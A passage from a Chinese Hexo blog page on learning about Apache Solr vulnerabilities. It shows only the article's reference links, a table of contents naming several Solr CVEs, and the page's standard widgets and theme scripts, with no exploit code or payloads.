+<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;oddboy.cn&#x2F;2017&#x2F;Apache-Solr-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%89%A9%E5%B1%95XXE%E5%8F%8A%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CRCE-CVE-2017-12629&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5965</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;solr&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;solr&#x2F;Remote-Streaming-Fileread&#x2F;README.zh-cn.md</span><br></pre></td></tr></table></figure>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Solr" >
+    <span class="tag-code">Solr</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/03/17/Rhit-Nginx%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
+        <span class="nav-arrow">← </span>
+        
+          Rhit-Nginx日志分析(可视化)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/04/20/Zabbix/">
+        
+          Zabbix
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">概述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">特点</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">环境搭建</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%88%86%E7%B1%BB"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">漏洞实战分类</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-12629"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">CVE-2017-12629</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">4.1.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">4.1.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-nav-number">4.1.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="toc-nav-number">4.1.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">4.1.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-nav-number">4.1.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2019-0193"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">CVE-2019-0193</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-nav-number">4.2.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-nav-number">4.2.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-nav-number">4.2.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-1"><span class="toc-nav-number">4.2.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-1"><span class="toc-nav-number">4.2.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-nav-number">4.2.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2019-17558"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">CVE-2019-17558</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-nav-number">4.3.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">4.3.2.</span> <span class="toc-nav-text">漏洞范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-nav-number">4.3.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-2"><span class="toc-nav-number">4.3.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-2"><span class="toc-nav-number">4.3.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-nav-number">4.3.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Solr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-nav-number">4.4.</span> <span class="toc-nav-text">Solr任意文件读取</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-nav-number">4.4.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%8C%83%E5%9B%B4-1"><span class="toc-nav-number">4.4.2.</span> <span class="toc-nav-text">漏洞范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-nav-number">4.4.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-3"><span class="toc-nav-number">4.4.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-3"><span class="toc-nav-number">4.4.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-nav-number">4.4.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Referer"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">Referer</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/03/25/Solr漏洞/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://www.si1ent.xyz/css/images/logo.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://www.si1ent.xyz/css/images/logo.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Solr漏洞学习",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "",
+          client_secret: ""
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.J_9220772140.115.26b47b3dkZ3BnL#/Integrated/index"><p class="copyright">
+    皖ICP备19004273号-1
+  </p>
+    </a>
+</footer>
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
